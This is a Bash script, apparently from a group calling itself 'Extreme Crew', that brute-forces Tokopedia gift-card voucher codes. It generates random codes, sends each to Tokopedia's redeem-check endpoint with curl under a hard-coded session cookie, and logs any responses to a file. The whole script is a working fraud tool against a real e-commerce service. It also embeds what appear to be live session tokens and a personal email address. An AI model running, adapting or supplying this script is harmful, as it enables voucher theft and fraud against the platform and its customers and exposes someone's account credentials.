#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ5MTg5OXxJakJMYlVGVmJFRjNTMWx3YjNFdmNrVlFPRFJQU2xNdlVYWkZlSFJJU25kMWRITkZhRTAyTUVoTlUzYzlJZ289fBqrrXrq1M-b8C7Yxar70rOgMMtqMGGcJciy6wej1_w8; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; insUserData=%7B%22email%22%3A%22bagusputra%40india2in.com%22%7D; __sonar=13069547389418187743; state=eyJsZCI6Imh0dHBzOi8vYWNjb3VudHMudG9rb3BlZGlhLmNvbS90aGFua3M_dGhlbWU9ZGVmYXVsdFx1MDAyNmxkPVx1MDAyNmFjdGl2YXRpb25fdHlwZT01IiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbSIsInV1aWQiOiIzYTI3Y2RhMi1iYmVhLTQzMmEtYWZlMC1iN2JiZjI1YWE1YzUiLCJ0aGVtZSI6ImRlZmF1bHQifQ; l=1; ins-gaSSId=d692dfc9-b4dc-4143-79a7-96e265692334_1524495421; scs=%7B%22t%22%3A1%7D; insdrSV=4; _ID_autocomplete_=aaa768ec13974d1abe05b142b146aa87; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiNzI5MzM5ZmEtYzlkMC00Zjk1LWIzZmEtNTZlYWY3NGU3MzFkIiwiaXNfYWpheCI6dHJ1ZX0; _SID_Tokopedia_=XyVL2h83haAZoDYuwMQ0QvUVgizQvasKKP69N4NAW0SxNoO7_99M1tNPBcOnmQo62i9o6b7wqkUogeeF7QUO9bo2O6ZoP0HpRGcHCEO45pHNXcJoqrYl-GwVSorTEX94; pulsa-aff=undefined; _ga=GA1.2.1866445509.1524491815; _gid=GA1.2.1738725623.1524491815; _dc_gtm_UA-9801603-23=1; _ampSES=091ad15ff0SES503deaa89c16-30798-1524491906096; _ampUITN=3c5fddfb4cbotb51ead7c23c0-30798-1524491906112; _ampNV=0; _ampRV=1; _ampCon=Canada; _ampCity=Montreal"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
